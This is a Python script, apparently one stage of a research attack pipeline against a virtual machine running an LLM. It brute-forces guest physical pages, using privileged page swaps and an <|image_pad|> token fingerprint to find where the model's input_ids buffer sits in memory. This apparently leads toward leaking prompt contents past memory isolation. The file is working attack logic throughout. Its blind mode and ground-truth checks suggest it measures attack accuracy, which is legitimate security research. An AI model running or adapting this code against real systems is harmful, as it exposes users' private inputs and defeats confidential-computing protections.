#!/usr/bin/env python3
"""
case_study/llm/pipeline/stage3_locate_base.py — Stage 3: Sharp Localization (Base GPA Identification).

Tasks:
1. Load ranked 2MB candidate blocks from Stage 2 (or CLI arguments).
2. Execute 1-swap Image-Pad fingerprint scan across candidate blocks and adaptive fallback chain.
3. Pinpoint the exact input_ids base GPA (host_base) with minimal PSP swaps (1-swap per page).
4. Export stage3_located_{index}.json for Stage 4 pad boundary estimation.

Usage:
    python3 stage3_locate_base.py --index 2 --output-dir .
    python3 stage3_locate_base.py --stage2-json stage2_tracked_2.json --output-dir .
"""

import argparse
import json
import sys
import time
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple

import common as c


def read_at_fixed(fixed_gpa: int, src_gpa: int, tag: str) -> bytes:
    """Read src_gpa plaintext by swapping it into fixed_gpa via swap_pages_tool."""
    from mura_dict_build import do_swap_read, parse_dump
    c.SCAN_TMP.mkdir(exist_ok=True)
    tmp = c.SCAN_TMP / f"{tag}.out"
    do_swap_read(fixed_gpa, src_gpa, tmp, c.SWAP_TOOL)
    data = parse_dump(tmp)
    tmp.unlink(missing_ok=True)
    return data


def scan_pages(fixed_gpa: int, ip_ref: bytes, ip_mask: Set[int], block_base: int,
               start_page: int, end_page: int, pacer: c.Pacer, budget: int,
               probed: Optional[Set[int]] = None) -> Tuple[Optional[int], int, int]:
    """Scan candidate pages in block_base using 1-swap Image-Pad fingerprint matching.

    Pages already read in this run (tracked in `probed`) are skipped to avoid
    burning swaps — and wall-clock — on a GPA whose fingerprint we already have.
    """
    best_page, best_hits, swaps = None, -1, 0
    for pg in range(start_page, end_page + 1):
        if swaps >= budget:
            break
        page = block_base + pg * c.PAGE_SIZE
        if probed is not None and page in probed:
            continue
        pacer.tick()
        swaps += 1
        if probed is not None:
            probed.add(page)
        data = read_at_fixed(fixed_gpa, page, "pg_scan")
        hits = sum(1 for j in ip_mask if c.get_chunk(data, j) == c.get_chunk(ip_ref, j))
        if hits > best_hits:
            best_page, best_hits = page, hits
        if hits >= c.IMAGE_PAD_MATCH_MIN:
            return page, hits, swaps
    return None, best_hits, swaps


def _runs_for_block(candidate_runs: Optional[Dict[Any, Any]], blk: int) -> List[Tuple[int, int]]:
    """Parse candidate_runs[blk] -> [(run_start_gpa, run_len_pages), ...]."""
    if not candidate_runs:
        return []
    entry = candidate_runs.get(blk)
    if entry is None:
        for k in (hex(blk), f"0x{blk:x}", f"0x{blk:X}", f"0x{blk:011x}", f"0x{blk:016x}", str(blk)):
            if k in candidate_runs:
                entry = candidate_runs[k]
                break
    if not entry:
        return []
    out: List[Tuple[int, int]] = []
    for item in entry:
        try:
            s, l = item[0], item[1]
            s = int(s, 16) if isinstance(s, str) else int(s)
            out.append((s, int(l)))
        except Exception:
            continue
    return out


def _run_pages_ts_desc(candidate_runs: Optional[Dict[Any, Any]], blk: int) -> List[int]:
    """Written pages of block `blk`, ordered LATEST run-ts first (input_ids is
    written late, so this reaches it in ~2 swaps). candidate_runs entries are
    [start_hex, run_len, run_start_ts]."""
    if not candidate_runs:
        return []
    entry = candidate_runs.get(blk)
    if entry is None:
        for k in (hex(blk), f"0x{blk:x}", f"0x{blk:X}", f"0x{blk:011x}", f"0x{blk:016x}", str(blk)):
            if k in candidate_runs:
                entry = candidate_runs[k]
                break
    if not entry:
        return []
    runs = []
    for item in entry:
        try:
            s = int(item[0], 16) if isinstance(item[0], str) else int(item[0])
            l = int(item[1])
            ts = int(item[2]) if len(item) > 2 else 0
            runs.append((s, l, ts))
        except Exception:
            continue
    runs.sort(key=lambda r: -r[2])  # latest ts first
    pages: List[int] = []
    seen: Set[int] = set()
    for s, l, _ in runs:
        for k in range(l):
            p = s + k * c.PAGE_SIZE
            if p not in seen:
                seen.add(p)
                pages.append(p)
    return pages


def _pages_ts_desc(candidate_page_ts: Optional[Dict[Any, Any]], blk: int) -> List[int]:
    """Written pages of block `blk`, ordered by per-PAGE first-write ts DESC
    (already sorted this way by Stage 2's export). This is the accurate order
    -- unlike _run_pages_ts_desc, a page inside an early-started long run does
    not get mis-ordered. candidate_page_ts entries are [page_hex, ts]."""
    if not candidate_page_ts:
        return []
    entry = candidate_page_ts.get(blk)
    if entry is None:
        for k in (hex(blk), f"0x{blk:x}", f"0x{blk:X}", f"0x{blk:011x}", f"0x{blk:016x}", str(blk)):
            if k in candidate_page_ts:
                entry = candidate_page_ts[k]
                break
    if not entry:
        return []
    pages: List[int] = []
    for item in entry:
        try:
            p = int(item[0], 16) if isinstance(item[0], str) else int(item[0])
            pages.append(p)
        except Exception:
            continue
    return pages


def _run_bases_for_block(candidate_run_bases: Optional[Dict[Any, Any]], blk: int) -> List[int]:
    """Parse candidate_run_bases[blk] -> [run_start_gpa, ...] (hex strings)."""
    if not candidate_run_bases:
        return []
    entry = candidate_run_bases.get(blk)
    if entry is None:
        for k in (hex(blk), f"0x{blk:x}", f"0x{blk:X}", f"0x{blk:011x}", f"0x{blk:016x}", str(blk)):
            if k in candidate_run_bases:
                entry = candidate_run_bases[k]
                break
    if not entry:
        return []
    out: List[int] = []
    for item in entry:
        try:
            out.append(int(item, 16) if isinstance(item, str) else int(item))
        except Exception:
            continue
    return out


def scan_run_window(fixed_gpa: int, ip_ref: bytes, ip_mask: Set[int],
                    runs: List[Tuple[int, int]], block_base: int, pacer: c.Pacer,
                    budget: int, probed: Set[int], back_pages: int
                    ) -> Tuple[Optional[int], int, int]:
    """Scan the region a block's write-runs cover, plus `back_pages` pages BEFORE
    the earliest run, for the image_pad anchor.

    The input_ids buffer is [prefix text][image_pad x N][indication text]. The
    tracker's captured runs commonly start in the prefix/indication, so the
    image_pad landmark sits OFF run_start (often a few pages before the earliest
    captured run). Probing run_start alone (Phase 1) then reads 0 image_pad hits
    and misses. Scanning forward from (earliest_run_start - back_pages) — which
    reaches the image_pad region first — finds it. Returns (anchor_gpa, hits, swaps)."""
    if not runs or budget <= 0:
        return None, -1, 0
    starts = [s for s, _ in runs]
    lo = min(starts) - back_pages * c.PAGE_SIZE
    hi = max(s + l * c.PAGE_SIZE for s, l in runs)
    lo = max(lo, block_base)
    hi = min(hi, block_base + c.BLOCK_SIZE)
    best_page, best_hits, swaps = None, -1, 0
    pg = lo
    while pg < hi and swaps < budget:
        if pg >= 0 and pg not in probed:
            pacer.tick()
            swaps += 1
            probed.add(pg)
            data = read_at_fixed(fixed_gpa, pg, "run_win")
            hits = sum(1 for j in ip_mask if c.get_chunk(data, j) == c.get_chunk(ip_ref, j))
            if hits > best_hits:
                best_page, best_hits = pg, hits
            if hits >= c.IMAGE_PAD_MATCH_MIN:
                return pg, hits, swaps
        pg += c.PAGE_SIZE
    return (best_page if best_hits > 0 else None), best_hits, swaps


def locate_base_gpa(fixed_gpa: int, ip_ref: bytes, ip_mask: Set[int],
                    tracker_candidates: List[int], known_blocks: Dict[int, int],
                    recency_list: List[int], pacer: c.Pacer,
                    candidate_run_bases: Optional[Dict[Any, List[Any]]] = None,
                    bootstrap_block: Optional[int] = None,
                    blind: bool = False,
                    candidate_runs: Optional[Dict[Any, Any]] = None,
                    candidate_page_ts: Optional[Dict[Any, Any]] = None) -> Tuple[Optional[int], int, str, int]:
    """
    Filtered Brute-Force 2MB Page Swapper for Base GPA Localization.
    
    1. Evaluates Top-K candidate 2MB blocks (Top 1~5) with dedicated per-block swap budgets (30 swaps/block).
    2. Within each 2MB block (512 pages):
       a. Run Starting Points (0..12 pages): Directly probes prompt allocation headers where <|image_pad|> begins.
       b. Pixel Values Tensor Skip: Skips dense float vision tensor interiors (>40 pages), probing only boundaries.
       c. Filtered Stride-4 Scan: Covers active spans to ensure no fragmented/unsegmented runs are missed.
       d. Immediate Early Termination: On cryptographic <|image_pad|> match (hits >= min_match), refines base and returns.
    """
    total_swaps = 0
    overall_best_hits = 0
    probed: Set[int] = set()
    best_unconfirmed: Tuple[Optional[int], int] = (None, -1)

    def probe(pg: int, tag: str):
        nonlocal total_swaps, overall_best_hits
        if pg < 0 or pg in probed or total_swaps >= c.MAX_LOC_SWAPS_SAMPLE:
            return None
        pacer.tick()
        total_swaps += 1
        probed.add(pg)
        data = read_at_fixed(fixed_gpa, pg, tag)
        hits = sum(1 for j in ip_mask if c.get_chunk(data, j) == c.get_chunk(ip_ref, j))
        if hits > overall_best_hits:
            overall_best_hits = hits
        return data, hits

    min_match = max(c.IMAGE_PAD_MATCH_MIN, int(len(ip_mask) * 0.35))

    # Candidate blocks from Stage 2 write tracking
    blocks: List[int] = []
    for b in tracker_candidates[:c.N_TRACKER_CANDIDATES]:
        if b not in blocks:
            blocks.append(b)
    if bootstrap_block is not None and not blind and bootstrap_block not in blocks:
        blocks.append(bootstrap_block)

    # Phase K (non-blind): the 2MB block is KNOWN — find the exact input_ids page
    # inside it. Only the input page's image_pad content matches ip_ref strongly
    # (validated: real page 134-248/256, other pages <40), so we scan candidate
    # pages and EARLY-STOP on the first strong match — that first match IS the
    # input page (we stop AT it, not before it), and we skip the remaining pages
    # to save swaps. To minimize swaps we scan only the block's WRITTEN pages
    # (from the tracker runs) instead of all 512; the input page is always among
    # them. Falls back to a stride-1 full-block scan if no run info is available.
    if bootstrap_block is not None and not blind:
        # Prefer per-PAGE ts order (already latest-first from Stage 2); it reaches
        # the input page in ~2 swaps. Fall back to per-run ts, then full block.
        written = _pages_ts_desc(candidate_page_ts, bootstrap_block)
        if not written:
            written = _run_pages_ts_desc(candidate_runs, bootstrap_block)
        written = [p for p in written if (p & ~(c.BLOCK_SIZE - 1)) == bootstrap_block]
        scan_pages_list = written if written else [
            bootstrap_block + o * c.PAGE_SIZE for o in range(c.PAGES_PER_BLOCK)]
        print(f"    [known-block] 0x{bootstrap_block:x}: scanning {len(scan_pages_list)} "
              f"{'written (latest-ts first)' if written else 'all'} pages (early-stop on image_pad match)")
        for pg in scan_pages_list:
            if total_swaps >= c.MAX_LOC_SWAPS_SAMPLE:
                break
            r = probe(pg, "known_block")
            if r is None:
                continue
            _, hits = r
            if hits >= min_match:
                print(f"    [loc] known-block page 0x{pg:x} img_hits={hits}/{len(ip_mask)} "
                      f"in {total_swaps} swaps -> CONFIRMED input_ids")
                return pg, total_swaps, f"known@0x{pg:x}", overall_best_hits
            if hits > best_unconfirmed[1]:
                best_unconfirmed = (pg, hits)

    # Phase 0: Adaptive Cache from recent samples
    for blk in recency_list[:2]:
        if total_swaps >= c.MAX_LOC_SWAPS_SAMPLE:
            break
        last_off = known_blocks.get(blk)
        if last_off is not None:
            deltas = [0, 1, -1, 2, -2, 4, -4]
            for delta in deltas:
                if total_swaps >= 12 or total_swaps >= c.MAX_LOC_SWAPS_SAMPLE:
                    break
                pg = blk + (last_off + delta) * c.PAGE_SIZE
                if pg < blk or pg >= blk + c.BLOCK_SIZE:
                    continue
                r = probe(pg, "cache")
                if r is None:
                    continue
                _, hits = r
                if hits >= min_match:
                    print(f"    [loc] cache-hit block 0x{blk:x} page 0x{pg:x} (delta={delta:+d}) "
                          f"img_hits={hits}/{len(ip_mask)} in {total_swaps} swaps -> CONFIRMED input_ids")
                    return pg, total_swaps, f"cache@0x{pg:x}", overall_best_hits
                if hits > best_unconfirmed[1]:
                    best_unconfirmed = (pg, hits)

    # Phase 1: Filtered Brute-Force 2MB Scanning on Top-5 Candidate Blocks
    for blk_idx, blk in enumerate(blocks[:5]):
        if total_swaps >= c.MAX_LOC_SWAPS_SAMPLE:
            break

        blk_start_swaps = total_swaps
        block_max_swaps = c.PER_BLOCK_LOC_BUDGET  # 30 swaps per block

        runs = _runs_for_block(candidate_runs, blk)
        if not runs:
            for gpa in _run_bases_for_block(candidate_run_bases, blk):
                runs.append((gpa, 1))
        if not runs:
            runs = [(blk, 1)]

        # 1. Target generation: Run-start window (0..12 pages) + Pixel skip boundaries
        targets: List[int] = []
        for run_start, run_len in runs:
            run_end = run_start + (run_len - 1) * c.PAGE_SIZE
            if run_len <= c.RUN_START_PROBE_WINDOW:
                # Short run: probe all pages
                for off in range(run_len):
                    targets.append(run_start + off * c.PAGE_SIZE)
            else:
                # Large run: probe run-start window (0..12) where <|image_pad|> begins
                for off in range(min(run_len, c.RUN_START_PROBE_WINDOW)):
                    targets.append(run_start + off * c.PAGE_SIZE)
                
                # If run > 40 pages, skip dense inner float pixel values and probe tail boundary
                if run_len >= c.PIXEL_VALUES_SKIP_THRESHOLD:
                    for off in (0, -1, -2, -3, -4):
                        pg = run_end + off * c.PAGE_SIZE
                        if run_start <= pg <= run_end:
                            targets.append(pg)

        # 2. Filter and deduplicate targets within 2MB block bounds
        valid_targets = []
        for t in targets:
            if blk <= t < blk + c.BLOCK_SIZE and t not in probed and t not in valid_targets:
                valid_targets.append(t)

        # Probe priority targets for this block
        for probe_pg in valid_targets:
            if total_swaps - blk_start_swaps >= block_max_swaps or total_swaps >= c.MAX_LOC_SWAPS_SAMPLE:
                break
            r = probe(probe_pg, f"bf-run-blk{blk_idx}")
            if r is not None:
                _, hits = r
                if hits >= min_match:
                    # Refine base: check if previous page is also part of input_ids
                    base_pg = probe_pg
                    for step_back in (1, 2):
                        prev_pg = probe_pg - step_back * c.PAGE_SIZE
                        if prev_pg >= blk and prev_pg not in probed:
                            pr = probe(prev_pg, f"refine-blk{blk_idx}")
                            if pr is not None and pr[1] >= min_match:
                                base_pg = prev_pg
                            else:
                                break
                    print(f"    [loc] Filtered-BF HIT in Block #{blk_idx+1} (0x{blk:x}) page 0x{base_pg:x} "
                          f"img_hits={hits}/{len(ip_mask)} in {total_swaps} swaps -> CONFIRMED input_ids")
                    return base_pg, total_swaps, f"filtered_bf@0x{base_pg:x}", overall_best_hits
                if hits > best_unconfirmed[1]:
                    best_unconfirmed = (probe_pg, hits)

        # 3. Stride-4 Fallback Sweep across active envelope of this block if budget allows
        if total_swaps - blk_start_swaps < block_max_swaps and total_swaps < c.MAX_LOC_SWAPS_SAMPLE:
            starts = [s for s, _ in runs]
            ends = [s + l * c.PAGE_SIZE for s, l in runs]
            env_lo = max(blk, min(starts) - 4 * c.PAGE_SIZE)
            env_hi = min(blk + c.BLOCK_SIZE, max(ends) + 4 * c.PAGE_SIZE)
            
            for stride_pg in range(env_lo, env_hi, 4 * c.PAGE_SIZE):
                if total_swaps - blk_start_swaps >= block_max_swaps or total_swaps >= c.MAX_LOC_SWAPS_SAMPLE:
                    break
                if stride_pg in probed:
                    continue
                r = probe(stride_pg, f"bf-stride-blk{blk_idx}")
                if r is not None:
                    _, hits = r
                    if hits >= min_match:
                        print(f"    [loc] Filtered-Stride HIT in Block #{blk_idx+1} (0x{blk:x}) page 0x{stride_pg:x} "
                              f"img_hits={hits}/{len(ip_mask)} in {total_swaps} swaps -> CONFIRMED input_ids")
                        return stride_pg, total_swaps, f"stride@0x{stride_pg:x}", overall_best_hits
                    if hits > best_unconfirmed[1]:
                        best_unconfirmed = (stride_pg, hits)

    # Phase 2: Candidate Fast Sweep on Remaining Blocks (#6..#35) if swaps remain
    for blk_idx, blk in enumerate(blocks[5:35], 6):
        if total_swaps >= c.MAX_LOC_SWAPS_SAMPLE:
            break
        runs = _runs_for_block(candidate_runs, blk)
        if not runs:
            for gpa in _run_bases_for_block(candidate_run_bases, blk):
                runs.append((gpa, 1))
        if not runs:
            runs = [(blk, 1)]

        # Probe run start offsets (0, 1, 2)
        for run_start, run_len in runs[:2]:
            for off in (0, 1, 2):
                if total_swaps >= c.MAX_LOC_SWAPS_SAMPLE:
                    break
                probe_pg = run_start + off * c.PAGE_SIZE
                if blk <= probe_pg < blk + c.BLOCK_SIZE and probe_pg not in probed:
                    r = probe(probe_pg, f"fast-blk{blk_idx}")
                    if r is not None:
                        _, hits = r
                        if hits >= min_match:
                            print(f"    [loc] Fast-Run HIT in Block #{blk_idx} (0x{blk:x}) page 0x{probe_pg:x} "
                                  f"img_hits={hits}/{len(ip_mask)} in {total_swaps} swaps -> CONFIRMED input_ids")
                            return probe_pg, total_swaps, f"fast_run@0x{probe_pg:x}", overall_best_hits
                        if hits > best_unconfirmed[1]:
                            best_unconfirmed = (probe_pg, hits)

    # Phase 3: Non-blind bootstrap fallback scan
    if bootstrap_block is not None and not blind and total_swaps < c.MAX_LOC_SWAPS_SAMPLE:
        for off in range(0, 512, 4):
            if total_swaps >= c.MAX_LOC_SWAPS_SAMPLE:
                break
            pg = bootstrap_block + off * c.PAGE_SIZE
            if pg not in probed:
                r = probe(pg, "bootstrap_scan")
                if r is not None:
                    _, hits = r
                    if hits >= min_match:
                        print(f"    [loc] bootstrap-scan block 0x{bootstrap_block:x} page 0x{pg:x} "
                              f"img_hits={hits}/{len(ip_mask)} in {total_swaps} swaps -> CONFIRMED input_ids")
                        return pg, total_swaps, f"bootstrap@0x{pg:x}", overall_best_hits
                    if hits > best_unconfirmed[1]:
                        best_unconfirmed = (pg, hits)

    if best_unconfirmed[0] is not None and best_unconfirmed[1] >= min_match:
        pg = best_unconfirmed[0]
        return pg, total_swaps, f"best@0x{pg:x}", overall_best_hits
    return None, total_swaps, "FAIL", overall_best_hits


def run_stage3(index: int, stage2_json: Optional[Path] = None,
               candidate_blocks: Optional[List[int]] = None,
               output_dir: Optional[Path] = None,
               blind: bool = False) -> Dict[str, Any]:
    out_dir = output_dir or c.PIPELINE_DIR
    out_dir.mkdir(parents=True, exist_ok=True)
    out_json = out_dir / f"stage3_located_{index}.json"

    print("=" * 70)
    print(f"  [Stage 3] Sharp Base GPA Localization for Sample {index}")
    print("=" * 70)

    # Load candidate blocks and candidate run bases
    gt_base = None
    gt_ind = None
    cand_run_bases = {}
    cand_runs = {}
    cand_page_ts = {}
    if stage2_json and stage2_json.exists():
        st2 = c.load_json(stage2_json)
        cand_blks = [int(x, 16) for x in st2.get("candidate_blocks", [])]
        cand_run_bases = st2.get("candidate_run_bases", {})
        cand_runs = st2.get("candidate_runs", {})
        cand_page_ts = st2.get("candidate_page_ts", {})
        gt_base = int(st2["gt_base"], 16) if st2.get("gt_base") else None
        gt_ind = st2.get("gt_indication")
    elif (out_dir / f"stage2_tracked_{index}.json").exists():
        st2 = c.load_json(out_dir / f"stage2_tracked_{index}.json")
        cand_blks = [int(x, 16) for x in st2.get("candidate_blocks", [])]
        cand_run_bases = st2.get("candidate_run_bases", {})
        cand_runs = st2.get("candidate_runs", {})
        cand_page_ts = st2.get("candidate_page_ts", {})
        gt_base = int(st2["gt_base"], 16) if st2.get("gt_base") else None
        gt_ind = st2.get("gt_indication")
    elif candidate_blocks:
        cand_blks = candidate_blocks
    else:
        print("[!] No candidate blocks provided or found", file=sys.stderr)
        return {"status": "NO_CANDIDATES"}

    from mura_dict_build import acquire_gpa
    from stage1_prepare_dict import acquire_imagepad_reference

    pacer = c.Pacer()
    fixed_gpa = acquire_gpa(None)
    ip_ref, ip_mask = acquire_imagepad_reference(fixed_gpa)
    print(f"[Stage 3] Image-Pad reference ready: {len(ip_mask)}/256 confirmed offsets")

    bootstrap = None if blind else ((gt_base & ~(c.BLOCK_SIZE - 1)) if gt_base else None)
    if blind:
        print("[Stage 3] BLIND mode: ground-truth block withheld from the search")
    host_base, loc_swaps, strategy, best_hits = locate_base_gpa(
        fixed_gpa=fixed_gpa,
        ip_ref=ip_ref,
        ip_mask=ip_mask,
        tracker_candidates=cand_blks,
        known_blocks={},
        recency_list=[],
        pacer=pacer,
        candidate_run_bases=cand_run_bases,
        candidate_runs=cand_runs,
        candidate_page_ts=cand_page_ts,
        bootstrap_block=bootstrap,
        blind=blind,
    )

    loc_match = c.loc_is_hit(host_base, gt_base) if (host_base and gt_base) else None
    page_delta = (((host_base & ~(c.PAGE_SIZE - 1)) - (gt_base & ~(c.PAGE_SIZE - 1)))
                  // c.PAGE_SIZE) if (host_base and gt_base) else None

    print(f"[Stage 3] Result: host_base={'0x%x' % host_base if host_base else 'NONE'}"
          f"  strategy={strategy}  swaps={loc_swaps}  best_hits={best_hits}"
          f"  match_GT={loc_match}")

    result = {
        "index": index,
        "host_base": hex(host_base) if host_base else None,
        "loc_strategy": strategy,
        "loc_swaps": loc_swaps,
        "best_hits": best_hits,
        "loc_match": loc_match,
        "page_delta": page_delta,
        "blind": blind,
        "gt_base": hex(gt_base) if gt_base else None,
        "gt_indication": gt_ind,
        "status": "SUCCESS" if host_base else "LOC_FAIL",
        "timestamp": time.time(),
    }

    c.save_json(out_json, result)
    print(f"[Stage 3] Saved localization result -> {out_json}")
    return result


def main():
    p = argparse.ArgumentParser(description="Stage 3: Image-Pad Fingerprint Base GPA Localization")
    p.add_argument("--index", type=int, default=2, help="Sample index")
    p.add_argument("--stage2-json", type=Path, default=None, help="Path to stage2_tracked_{index}.json")
    p.add_argument("--candidate-blocks", type=str, default=None, help="Comma-separated hex candidate 2MB blocks")
    p.add_argument("--output-dir", type=Path, default=c.PIPELINE_DIR, help="Output directory")
    p.add_argument("--blind", action="store_true", help="Withhold the ground-truth block from the search (measure true blind accuracy)")
    args = p.parse_args()

    cblks = [int(x.strip(), 16) for x in args.candidate_blocks.split(",")] if args.candidate_blocks else None
    run_stage3(args.index, stage2_json=args.stage2_json, candidate_blocks=cblks,
               output_dir=args.output_dir, blind=args.blind)


if __name__ == "__main__":
    main()
